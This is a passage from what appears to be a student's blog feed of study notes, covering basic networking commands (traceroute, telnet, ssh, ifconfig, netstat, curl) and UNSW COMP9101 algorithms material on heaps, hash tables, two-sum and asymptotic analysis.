*</code></pre><p><code>*</code> 表示该探测包 没有收到 ICMP 响应，可能的原因包括：</p><pre><code>该路由器丢弃 ICMP 超时（TTL exceeded）消息可能是防火墙策略不允许返回 ICMP Time Exceeded。负载均衡或不同路径可能 traceroute 的三个探测包走了不同路径，其中有的路径不返回响应。ICMP 速率限制该路由器可能设置了ICMP 响应频率限制，有时会返回，有时不会。</code></pre><p>7  <em> ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.971 ms </em></p><p><em>（第一个探测包）：没有收到该路由器的 ICMP 响应（可能是防火墙或 ICMP 限制）。<br>1.971 ms（第二个探测包）：成功收到 ICMP 响应。</em>（第三个探测包）：同样没有收到 ICMP 响应。</p><h1 id="telnet-obsolete"><a href="#telnet-obsolete" class="headerlink" title="telnet (obsolete)"></a>telnet (obsolete)</h1><p>The <strong>telnet</strong> utility connects one host to another (remote login) via the Internet. This command allows you to log onto machines worldwide that you have accounts on or that allow public access. The most common way to use the command is:</p><pre><code>telnet host [port]</code></pre><p>port indicates a port number (address of an application); if it is not specified, the default telnet port is used.</p><p>After issuing the <strong>telnet</strong> command, you will receive a login prompt for the host system. You may now log in to the host system. When you are finished with your remote session, log out as usual. Telnet is inherently insecure and is often disabled on most hosts.</p><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>SSH is a set of standards and an associated network protocol that allows for establishing a secure channel between a local and a remote computer. The SSH client - <strong>ssh</strong> - that supports terminal protocols is typically used to administer the SSH server computer remotely via the terminal console. Thus, it is used as an alternative to telnet . The most common way to use the command is:</p><pre><code>ssh -l username hostname</code></pre><p>or</p><pre><code>ssh username@hostname</code></pre><p>After issuing the ssh command, if the remote computer authenticates you successfully, you will receive a login prompt for the remote machine. You may now log in to the host system. When you are finished with your remote session, log out as usual.</p><h1 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h1><p>The <strong>ifconfig</strong> utility is used to assign an address to a network interface and to configure or display the current network interface configuration information. It must be used at system startup to define the network address of each interface present on a machine. After system startup, it can redefine an interface’s address and other operating parameters. If a single interface argument is given, it displays the status of the given interface only; if a single -a argument is given, it shows the status of all interfaces. Otherwise, it configures an interface.</p><p>Note: the directory /sbin is not the path of a typical user. So you may have to type /sbin/ifconfig</p><h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h1><p>The <strong>netstat</strong> utility allows the printing of various data related to the network configuration of a station. Here, we show only two forms of this command:</p><p>Option -i allows printing the state of the network interfaces (e.g. eth0 or lo).</p><p>The MTU and Met fields show the interface’s current MTU and metric values. The RX and TX columns show the number of packets received or transmitted error-free (RX-OK/TX-OK) or damaged (RX-ERR/TX-ERR), dropped (RX-DRP/TX-DRP), and lost because of an overrun (RX-OVR/TX-OVR).</p><p>The last column shows the flags that have been set for this interface. These characters are one-character versions of the long flag names that are printed when you display the interface configuration with ifconfig :</p><h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><pre><code>curl www.example.com</code></pre><p>The command will show the response text of HTTP only. It wont show the request and response headers.</p><pre><code>curl -v www.example.com</code></pre><p>The command will show the response text of HTTP only. It also shows the request and response headers.</p><pre><code>curl -v www.example.com*   Trying 23.40.52.182:80...* Connected to www.example.com (23.40.52.182) port 80 (#0)&gt; GET / HTTP/1.1&gt; Host: www.example.com&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Content-Type: text/html&lt; ETag: &quot;84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134&quot;&lt; Last-Modified: Mon, 13 Jan 2025 20:11:20 GMT&lt; Cache-Control: max-age=3538&lt; Date: Sun, 02 Mar 2025 22:37:52 GMT&lt; Content-Length: 1256&lt; Connection: keep-alive&lt; &lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> COMP9331 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wk1-tut</title>
      <link href="/2025/02/21/COMP9101/wk1-tut/"/>
      <url>/2025/02/21/COMP9101/wk1-tut/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#2n-number-the-largest-number">2n number, the largest number</a></li><li><a href="#2n-number-the-two-largest-numbers">2^n number, the two largest numbers</a><ul><li><a href="#answer">Answer</a><ul><li><a href="#1-sequence-of-leaves-are-random-red-or-blue">1. sequence of leaves are random red or blue</a></li><li><a href="#2-if-two-two-red-and-blue-leaves">2. if two-two red and blue leaves</a></li></ul></li></ul></li><li><a href="#two-sum">two sum</a></li><li><a href="#three-sum">three sum</a></li><li><a href="#shortest-path">shortest path</a></li><li><a href="#birthday-in-a-list">Birthday in a list</a></li></ul><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-27-13-31-10.png" alt></p><h1 id="2n-number-the-largest-number"><a href="#2n-number-the-largest-number" class="headerlink" title="2n number, the largest number"></a>2n number, the largest number</h1><p>(a) Suppose that you have an array of $2n$ distinct integers. How can you find the smallest and largest integers using at most $3n−2$ comparisons?</p><p><strong>Note.</strong> Naively finding the smallest and largest integers will take $(2n−1)+(2n − 2)=4n−3$ comparisons, which is too many.Try and eliminate some redundant comparisons.</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-09-06.png" alt></p><hr><h1 id="2-n-number-the-two-largest-numbers"><a href="#2-n-number-the-two-largest-numbers" class="headerlink" title="2^n number, the two largest numbers"></a>2^n number, the two largest numbers</h1><p>(b) Now, suppose you have an array of $2^n$ distinct integers. How can you find the largest two integers using at most $2^n+n−2$ comparisons? </p><p><strong>Hint</strong>. Do something similar with a different data structure.</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-09-26.png" alt></p><hr><p>You are handed a complete binary tree with $4^n$ leaves, each leaf coloured either blue or red. You play a game with your friend on the tree. To play the game, you and your friend place down $1 M on the root of the tree. You then take it in turns to move the money down the tree, to one of its children. The game ends when the money lands at one of the leaf vertices.</p><p>You win $2M if the coin lands at a leaf vertex coloured red, and lose $1 M if the coin lands at a leaf vertex coloured blue. You make the initial move so that your opponent makes the final move. Your task is to decide whether to play the game or not.</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-39-42.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-44-01.png" alt></p><h2 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h2><h3 id="1-sequence-of-leaves-are-random-red-or-blue"><a href="#1-sequence-of-leaves-are-random-red-or-blue" class="headerlink" title="1. sequence of leaves are random red or blue"></a>1. sequence of leaves are random red or blue</h3><p>Normally, if the sequence of leaves are random red or blue, my friend always take the last step to the two children. Hence it’s possible that he is always intended to choose the blue.</p><h3 id="2-if-two-two-red-and-blue-leaves"><a href="#2-if-two-two-red-and-blue-leaves" class="headerlink" title="2. if two-two red and blue leaves"></a>2. if two-two red and blue leaves</h3><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-36-24.png" alt></p><p>Just like this, if I could control the penultimate turn, I always control the flow into the node with two red leaves.</p><p>Then I always win!</p><hr><h1 id="two-sum"><a href="#two-sum" class="headerlink" title="two sum"></a>two sum</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-47-03.png" alt></p><hr><h1 id="three-sum"><a href="#three-sum" class="headerlink" title="three sum"></a>three sum</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-47-10.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-02-55.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-03-01.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-03-27.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-06-49.png" alt></p><p>The minimum time complexity is $O(n^2)$</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-44-08.png" alt></p><hr><h1 id="shortest-path"><a href="#shortest-path" class="headerlink" title="shortest path"></a>shortest path</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-04-09.png" alt></p><hr><h1 id="Birthday-in-a-list"><a href="#Birthday-in-a-list" class="headerlink" title="Birthday in a list"></a>Birthday in a list</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-54-23.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-01-10.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-01-16.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-01-37.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>merge sort</title>
      <link href="/2025/02/21/Algorithm/merge-sort/"/>
      <url>/2025/02/21/Algorithm/merge-sort/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1em1oYTEFf">bilibili merge sort</a></p><p><img src="/2025/02/21/Algorithm/merge-sort/2025-02-21-14-29-47.png" alt></p><p><img src="/2025/02/21/Algorithm/merge-sort/2025-02-21-14-32-08.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Data Structures</title>
      <link href="/2025/02/21/Algorithm/Data-Structures/"/>
      <url>/2025/02/21/Algorithm/Data-Structures/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#basic-data-structure">Basic data structure</a><ul><li><a href="#arrays">Arrays</a></li><li><a href="#linked-lists">Linked lists</a></li><li><a href="#stacks">Stacks</a></li><li><a href="#queues">Queues</a></li><li><a href="#heaps">Heaps</a><ul><li><a href="#heap-features">heap features</a></li><li><a href="#full-binary-tree">Full Binary Tree</a></li><li><a href="#perfect-binary-tree">Perfect Binary Tree</a></li><li><a href="#complete-binary-tree">Complete Binary Tree</a></li><li><a href="#time-complexity">time complexity</a></li><li><a href="#reference">reference</a></li></ul></li><li><a href="#hash-tables">Hash tables</a></li></ul></li></ul><h1 id="Basic-data-structure"><a href="#Basic-data-structure" class="headerlink" title="Basic data structure"></a>Basic data structure</h1><h3 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h3><ul><li>Stores $n$ items, indexed from $1$ to $n$.</li><li>Accessing an element has time complexity $O(1)$; insertion and deletion has time complexity $O(n)$; search has time complexity $O(n)$.</li></ul><h3 id="Linked-lists"><a href="#Linked-lists" class="headerlink" title="Linked lists"></a>Linked lists</h3><ul><li>Stores items in a list where each element has a link to the next element.</li><li>Accessing an element has time complexity $O(n)$; insertion and deletion has time complexity $O(1)$; search has time complexity $O(n)$.</li></ul><h3 id="Stacks"><a href="#Stacks" class="headerlink" title="Stacks"></a>Stacks</h3><ul><li>Stores items in LIFO (last-in, first-out) order.</li><li>Accessing the top of the stack has time complexity $O(1)$; insertion and deletion has time complexity $O(1)$ but we can only insert or delete from the top of the stack.</li></ul><h3 id="Queues"><a href="#Queues" class="headerlink" title="Queues"></a>Queues</h3><ul><li>Stores items in FIFO (first-in, first-out) order.</li><li>Accessing the front of the queue has time complexity $O(1)$; insertion and deletion has time complexity $O(1)$ but we can only insert or delete from the front of the queue.</li></ul><h3 id="Heaps"><a href="#Heaps" class="headerlink" title="Heaps"></a>Heaps</h3><ul><li><p>Stores items in a <strong>complete binary tree</strong> (<em>Notely <code>complete binart tree</code>‘s definition, just all full nodes except the lowest layer, and only adjacent lacks on right side</em> <a href="https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E5%8F%89%E6%A0%91#%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91">完全二叉树</a>). Minimum heaps ensure that every parent node is $≤$ all of its children nodes. Maximum heaps ensure that every parent node is $≥$ all of its children nodes.</p></li><li><p>Searching for the min/max has time complexity $O(1)$; insertion has time complexity $O(log n)$; deleting the min/max has time complexity $O(log n)$.</p></li></ul><p>We know for a perfect, how to infer its depth by the number of nodes: $H = log_2(N+1)$. Heapify up or down is mainly according to its depth, hence eventually the insertion and deleting for a heap (complete binary tree) is $O(log n)$.</p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-12-47-55.png" alt></p><p>When you want to populate a number, please refer to <a href="https://gallery.selfboot.cn/zh/algorithms/heap">visually observe heap</a>. The inserted number will always enter <strong>at the position of complete tree the lowest leftest position</strong>, then follow which type of the heap (<strong>Max heap</strong> or <strong>Min heap</strong>), adjust its position on the chain.</p><h4 id="heap-features"><a href="#heap-features" class="headerlink" title="heap features"></a>heap features</h4><p>For example, if I want to insert a new 22, at first it will be inserted here.</p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-12-58-07.png" alt></p><p>Then followed by the chain, the new number 22 would be adjusted to the position, which is greater than its child and smaller then its parent (<strong>heapify-up</strong> or <strong>heapify-down</strong>).</p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-12-59-33.png" alt></p><h4 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h4><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-22-07.png" alt></p><p>Every has either two or zero children.</p><h4 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h4><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-22-40.png" alt></p><p>A tree has $k$ layers, and $2^k - 1$ nodes.</p><p>A tree with only the root node is also a perfect binary tree.</p><p>Assume depth is H</p><p>Nodes: $2^H-1$</p><p>leaves: $2^{H-1}$</p><p>$i$ layer nodes: $2^{i-1}$</p><p>infer depth by nodes: $H = log_2(N+1)$</p><h4 id="Complete-Binary-Tree"><a href="#Complete-Binary-Tree" class="headerlink" title="Complete Binary Tree"></a>Complete Binary Tree</h4><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-23-03.png" alt></p><p>All internal nodes have 2 children, and all leaves are on the same layer.</p><h4 id="time-complexity"><a href="#time-complexity" class="headerlink" title="time complexity"></a>time complexity</h4><ol><li>Searching for the min/max has time complexity $O(1)$</li></ol><p>Obviously, a Max Heap’s root is the Maxmium, and a Min Heap’s root is the Minium. Just find the root node, hence it’s $O(1)$</p><ol><li>insertion has time complexity $O(logn)$; deleting the min/max has time complexity $O(log n)$.</li></ol><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://en.wikipedia.org/wiki/Heap_(data_structure">wikipedia</a>)</p><p><a href="https://www.youtube.com/watch?v=0wPlzMU-k00">youtube heap in 3 minutes</a></p><p><a href="https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E5%8F%89%E6%A0%91#%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91">完全二叉树</a></p><p><a href="https://gallery.selfboot.cn/zh/algorithms/heap">visually observe heap</a></p><h3 id="Hash-tables"><a href="#Hash-tables" class="headerlink" title="Hash tables"></a>Hash tables</h3><ul><li>Stores values indexed by keys. A hash function maps keys to indices in a fixed-size table.</li><li><strong>Worst case</strong>. Searching for an element given the key has time complexity $O(n)$; insertion and deletion has time complexity $O(n)$.</li><li><strong>Expected case</strong>. Searching for an element given the key has time complexity $O(1)$; insertion and deletion has time complexity $O(1)$.</li></ul><p><a href="https://en.wikipedia.org/wiki/Hash_table">wiki hash table</a></p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-52-30.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>recommanded_materials</title>
      <link href="/2025/02/21/COMP9101/recommanded-materials/"/>
      <url>/2025/02/21/COMP9101/recommanded-materials/</url>
      
        <content type="html"><![CDATA[<p>Liam Heng:</p><p>Self-plagiarising my response from last term:</p><p>There are always other resources if you’d like to read more on top of this as well:</p><p><a href="https://jeffe.cs.illinois.edu/teaching/algorithms/notes/98-induction.pdf">https://jeffe.cs.illinois.edu/teaching/algorithms/notes/98-induction.pdf</a></p><p><a href="https://cseweb.ucsd.edu/classes/sp05/cse101/JeffEdmondsBook.pdf">https://cseweb.ucsd.edu/classes/sp05/cse101/JeffEdmondsBook.pdf</a></p><p><a href="https://users.metu.edu.tr/serge/courses/111-2011/textbook-math111.pdf">https://users.metu.edu.tr/serge/courses/111-2011/textbook-math111.pdf</a></p><p>in addition to the listed textbooks on the Course Outline (CLRS and Kleinberg/Tardos).</p><p>Most of the textbooks have a soft copy that you can find online for free; I would only recommend buying it if you prefer a hard copy of the book or if you plan to do further algorithms study in the future. In saying that, Kleinberg and Tardos’s Algorithm Design (KT) and Erickson’s Algorithms books are quite beginner-friendly so they are good for when you are starting out in algorithms. They explain a lot of the concepts in greater depth and expand on a lot of the topics that we do in this course, so if you have an interest in learning about the field, they are good resources. They would also serve as good supplementary texts to the course.</p><p>Cormen, Leiserson, Rivest, Stein (CLRS) is a very comprehensive textbook and most experts in the field use it as the “reference guide”. But I would only recommend it after you take an algorithms course since it is quite dense and can be quite jarring to read.</p><p>Other books I would recommend are:</p><p>Tim Roughgarden’s Algorithm Illuminated. This is the book used in Stanford’s Algorithms course; there are also bite-sized videos offered by the author that you can find on YouTube. They cover most of the course and serve as good complementary videos in case anything you find in the course a bit hard to digest.</p><p>Steven Skiena’s Algorithm Design Manual. This is written in a very conversational manner, so it’s good if you’re looking for a more informal introduction to algorithms. It can be good for leetcode preparation since it goes through common pitfalls of problem solving as well as how you can recover from it.</p><p>Hopefully, a subset of these textbooks can serve as good supplements. They aren’t too bad of a read, so if you can spare a few nights or so, experiment with it and see what clicks for you!</p>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wk1-lec</title>
      <link href="/2025/02/19/COMP9101/wk1-lec/"/>
      <url>/2025/02/19/COMP9101/wk1-lec/</url>
      
        <content type="html"><![CDATA[<p>Extracted from the raw material from UNSW COMP9101, thanks for Serge Gaspers.</p><ul><li><a href="#lec">Lec</a></li><li><a href="#why-should-you-study-algorithms">Why should you study algorithms?</a><ul><li><a href="#two-pillars">Two pillars</a><ul><li><a href="#1-algorithm-design">1. algorithm design</a></li><li><a href="#2-algorithm-analysis">2. algorithm analysis</a></li></ul></li></ul></li><li><a href="#algorithm-analysis-why-is-correctness-important">Algorithm analysis: why is correctness important?</a></li><li><a href="#algorithm-analysis-why-is-efficiency-important">Algorithm analysis: why is efficiency important?</a></li><li><a href="#why-is-algorithm-design-important">Why is algorithm design important?</a></li><li><a href="#code-first-approach">Code-first approach</a></li><li><a href="#separating-design-from-implementation">Separating design from implementation</a></li><li><a href="#course-learning-outcomes">Course Learning Outcomes</a></li><li><a href="#what-is-an-algorithm">What is an algorithm?</a></li><li><a href="#scope">Scope</a></li><li><a href="#problem-structure">Problem structure</a></li><li><a href="#example-problem-geese-in-a-trenchcoat">Example problem: Geese in a Trenchcoat</a><ul><li><a href="#problem">Problem</a></li><li><a href="#abstraction">Abstraction</a></li><li><a href="#example-problem-geese-in-a-trenchcoat-1">Example problem: Geese in a Trenchcoat</a><ul><li><a href="#attempt-1">Attempt 1</a></li><li><a href="#attempt-2">Attempt 2</a></li><li><a href="#algorithm">Algorithm</a></li></ul></li></ul></li><li><a href="#puzzle">puzzle</a></li><li><a href="#lec2">Lec2</a><ul><li><a href="#question">Question</a></li><li><a href="#answer">Answer</a></li><li><a href="#big-ohnotation-examples">Big-Ohnotation: Examples</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a></li><li><a href="#example-3">Example 3</a></li></ul></li><li><a href="#question-1">Question</a></li><li><a href="#answer-1">Answer</a></li><li><a href="#big-omega-notation">Big-Omega notation</a><ul><li><a href="#definition">Definition</a></li></ul></li><li><a href="#big-theta-notation">Big-Theta notation</a><ul><li><a href="#definition-1">Definition</a></li></ul></li><li><a href="#question-2">Question</a></li><li><a href="#answer-2">Answer</a></li><li><a href="#sum-property">Sum property</a><ul><li><a href="#fact-of-sum">Fact of sum</a></li><li><a href="#fact-of-product">Fact of Product</a></li></ul></li><li><a href="#binaryheaps">(Binary)Heaps</a><ul><li><a href="#operations">Operations</a></li></ul></li><li><a href="#binary-search-trees">Binary search trees</a><ul><li><a href="#operations-1">Operations</a></li></ul></li><li><a href="#self-balancing-binary-search-trees">Self-balancing binary search trees</a></li><li><a href="#frequency-tables">Frequency tables</a><ul><li><a href="#problem-1">Problem</a></li><li><a href="#idea">Idea</a></li><li><a href="#challenge">Challenge</a></li><li><a href="#steps">steps</a></li><li><a href="#方法1求和">方法1：求和</a></li><li><a href="#方法2xor">方法2：XOR</a></li></ul></li><li><a href="#hash-tables">Hash tables</a><ul><li><a href="#operationsexpected">Operations(expected)</a></li><li><a href="#operations-worst-case">Operations (worst case)</a></li></ul></li></ul></li><li><a href="#proof">proof</a><ul><li><a href="#propositional-logic">Propositional logic</a></li></ul></li><li><a href="#mergesort">mergesort</a></li><li><a href="#stable-matching-problem">Stable Matching Problem</a><ul><li><a href="#gale-shapley-algorithm">Gale-Shapley algorithm</a></li><li><a href="#outline-of-algorithm">Outline of algorithm</a></li><li><a href="#关于此算法更有利于追求方被追求方少利">关于此算法更有利于追求方，被追求方少利</a></li></ul></li><li><a href="#puzzle-1">puzzle</a></li></ul><h1 id="Lec"><a href="#Lec" class="headerlink" title="Lec"></a>Lec</h1><h1 id="Why-should-you-study-algorithms"><a href="#Why-should-you-study-algorithms" class="headerlink" title="Why should you study algorithms?"></a>Why should you study algorithms?</h1><p>This course is about problem solving and communication.</p><h2 id="Two-pillars"><a href="#Two-pillars" class="headerlink" title="Two pillars"></a>Two pillars</h2><h3 id="1-algorithm-design"><a href="#1-algorithm-design" class="headerlink" title="1. algorithm design"></a>1. algorithm design</h3><p><strong>algorithm design</strong> is the task of designing a process which, when executed, solves a particular problem;</p><p>This process might be a way of calculating something, selecting something, etc.</p><h3 id="2-algorithm-analysis"><a href="#2-algorithm-analysis" class="headerlink" title="2. algorithm analysis"></a>2. algorithm analysis</h3><p><strong>algorithm analys</strong> is is the task of assessing such a process (either your own work or someone else’s) with regards to the problem.</p><p>Does it always give the intended result?</p><p>How quickly does it run?</p><h1 id="Algorithm-analysis-why-is-correctness-important"><a href="#Algorithm-analysis-why-is-correctness-important" class="headerlink" title="Algorithm analysis: why is correctness important?"></a>Algorithm analysis: why is correctness important?</h1><p>A program which fails a test case is wrong, but a program which passes a test case isn’t necessarily correct.</p><p>Failure on an obscure case can be catastrophic!</p><p>Testing is good, good testing is better, proof is best.</p><p>What makes a strong test?</p><p>How do you prove (or at least justify in general terms) correctness and explain it to a peer?</p><h1 id="Algorithm-analysis-why-is-efficiency-important"><a href="#Algorithm-analysis-why-is-efficiency-important" class="headerlink" title="Algorithm analysis: why is efficiency important?"></a>Algorithm analysis: why is efficiency important?</h1><p>Using better hardware might save a small (or even large) percentage of the running time of a program.</p><p>However a more efficient algorithm can make staggering improvements!</p><p>Sorting one million numbers could take an hour using bubble sort, or a second using merge sort.</p><p>For more sophisticated algorithms, details such as the choice of data structures are also important.</p><h1 id="Why-is-algorithm-design-important"><a href="#Why-is-algorithm-design-important" class="headerlink" title="Why is algorithm design important?"></a>Why is algorithm design important?</h1><p>Algorithm design is the ‘planning stage’, where we decide what our program should do.</p><p>We have all tried to code programs only to find a fundamental flaw in our approach later on.</p><p>A systematic approach to algorithm design separates engineers from “code monkeys”.</p><h1 id="Code-first-approach"><a href="#Code-first-approach" class="headerlink" title="Code-first approach"></a>Code-first approach</h1><p>Solving the problem as you code can lead you into a “debugging vortex”, applying patches without fixing the underlying issue, or to accept incorrect code that passes weak tests.</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-19-17-31-23.png" alt></p><p>Separating design from implementation allows high-level reasoning to confirm that the algorithm meets the requirements of the problem before making implementation decisions.</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-19-17-33-06.png" alt></p><h1 id="Separating-design-from-implementation"><a href="#Separating-design-from-implementation" class="headerlink" title="Separating design from implementation"></a>Separating design from implementation</h1><p>We will talk about algorithms in plain English. We will avoid pseudocode, and we will especially avoid using code in any programming language.</p><p>Implementation is outside the scope of this course.</p><p>We’ll focus on the big picture, to prepare you to:</p><ol><li><p>work in teams on large projects</p></li><li><p>communicate clearly and persuasively with stakeholders including colleagues, clients and the public</p></li><li><p>compile design briefs and documentation,</p></li></ol><p>which are all important skills for the modern computing professional.</p><h1 id="Course-Learning-Outcomes"><a href="#Course-Learning-Outcomes" class="headerlink" title="Course Learning Outcomes"></a>Course Learning Outcomes</h1><ol><li><p>Explain how standard design techniques are used to develop algorithms.</p></li><li><p>Solve problems by creatively applying algorithm design techniques.</p></li><li><p>Communicate algorithmic ideas at different abstraction levels.</p></li><li><p>Evaluate the efficiency of algorithms and justify their correctness.</p></li><li><p>Apply the LATEX typesetting system to produce high-quality technical documents.</p></li></ol><h1 id="What-is-an-algorithm"><a href="#What-is-an-algorithm" class="headerlink" title="What is an algorithm?"></a>What is an algorithm?</h1><p>An algorithm is a collection of precisely defined steps that can be executed <strong>mechanically</strong>, i.e. without intelligent decision-making.</p><p>Designing a recipe involves creativity, executing it does not; the same is true of algorithms.</p><p>The word “algorithm” comes by corruption of the name of <em>Muhammad ibn Musa al-Khwarizmi</em>, a Persian scientist 780–850, who wrote an important book on algebra, <em>“Al-kitab al-mukhtasar fi hisab al-gabr wa’l-muqabala”</em>.</p><h1 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h1><p>In this course we will deal only with algorithms that are:</p><ol><li><p><strong>sequential</strong>: comprised by a sequence of steps, which can only be executed one at a time, and</p></li><li><p><strong>deterministic</strong>: each step always gives the same result for the same input.</p></li></ol><p>Parallel algorithms and randomised algorithms are interesting and powerful, but beyond the scope of this course.</p><h1 id="Problem-structure"><a href="#Problem-structure" class="headerlink" title="Problem structure"></a>Problem structure</h1><ol><li><p>Problems may have ‘flavour text’: a brief story for context. Abstracting this information away is a key first step.</p></li><li><p>Algorithm design tasks may also include an input and output specification if it is not otherwise clear.</p></li><li><p>In this course, we are usually not concerned with the format in which this information is presented, nor with the minute details of how an implementation of the algorithm accesses input or produces output.</p></li><li><p>However it is crucially important that our algorithm <strong>always</strong> transforms valid input into the appropriate output <strong>efficiently</strong>.</p></li></ol><p>We’ll usually measure the efficiency of algorithms using asymptotic analysis, rather than the exact time or number of operations taken.</p><p>You will have already encountered big-Oh notation.</p><ul><li><p>For example, a process consisting of two nested loops “for each i from 1 to n, for each j from 1 to n” takes $O(n^2)$ time.</p></li><li><p>We’ll formalise these ideas in the next lecture.</p></li></ul><p>We’ll usually use the <strong>unit-cost</strong> model of computation, where each machine operation (+, −, ×, ÷ and accessing memory) takes constant time.</p><ul><li>The only exception is when we discuss algorithms to multiply large integers in Module 2: there we’ll use the <strong>logarithmic-cost</strong>  model, where these operations take time dependent on the  width (number of bits) of the input numbers.</li></ul><h1 id="Example-problem-Geese-in-a-Trenchcoat"><a href="#Example-problem-Geese-in-a-Trenchcoat" class="headerlink" title="Example problem: Geese in a Trenchcoat"></a>Example problem: Geese in a Trenchcoat</h1><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-19-17-50-51.png" alt></p><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>There are n geese in a gaggle, of heights $h_1,…,h_n$. Each $h_i$ is a positive integer.</p><p>They need to select two of themtoweara trenchcoat together,with one standing on top of the other.The trenchcoat will only fit if the two geese have total height exactly equal to H.</p><p>Design an algorithm which runs in $O(n logn)$ time and determines whether the there two geese who can wear the trenchcoat together.</p><h2 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h2><p>Design an algorithm which runs in $O(n logn)$ time and, given an array $A$ consisting of $n$ positive integers and a positive integer $X$, determines whether there are two indices  $i&lt;j$ such that $A[i]+A[j]=X$.</p><ul><li>If we fix index <em>i</em> (one of thegeese), then we know that a matching element must contribute the rest of the total (make up the rest of the required height).</li><li>Let’s try all values of i.</li></ul><h2 id="Example-problem-Geese-in-a-Trenchcoat-1"><a href="#Example-problem-Geese-in-a-Trenchcoat-1" class="headerlink" title="Example problem: Geese in a Trenchcoat"></a>Example problem: Geese in a Trenchcoat</h2><h3 id="Attempt-1"><a href="#Attempt-1" class="headerlink" title="Attempt 1"></a>Attempt 1</h3><p>For each goose i,check whether a matching goose (whose height is $H−h_i$) exists, and answer yes if one is found.</p><ul><li><p>This is not an algorithm!</p></li><li><p>It does not describe how to actually perform this check.</p></li><li><p>Why does this matter?</p></li><li><ul><li>For a small number of geese,a human could follow this process, checking by eye. If there were say one million geese, it’s not at all clear how to do the check.</li></ul></li><li><ul><li>Perhaps this check takes time?</li></ul></li></ul><p>The Big-Oh is:</p><script type="math/tex; mode=display">(n-1)+(n-2)+...+(1) = \frac{n*(n-1)}{2} \in O(n^2)</script><h3 id="Attempt-2"><a href="#Attempt-2" class="headerlink" title="Attempt 2"></a>Attempt 2</h3><p>For each goose i, a matching goose must have height $H - h_i$. For each other goose $j$, check whether $h_j$ equals this quantity, and answer yes if one is found.</p><ul><li>This is actually an algorithm</li><li>It is also a correct algorithm.</li><li><ul><li>Does it correctly answer all ‘yes’ instances?</li></ul></li><li><ul><li>Does it correctly answer all ‘no’ instances?</li></ul></li><li><p>Unfortunately it’s too slow: “for each i (of which there are n), for each j (of which there are n), do something” is already  $n^2$ iterations.</p></li><li>Can we search efficiently for the correct j, rather than trying them all? Perhaps if the heights are well organised.</li></ul><h3 id="Algorithm"><a href="#Algorithm" 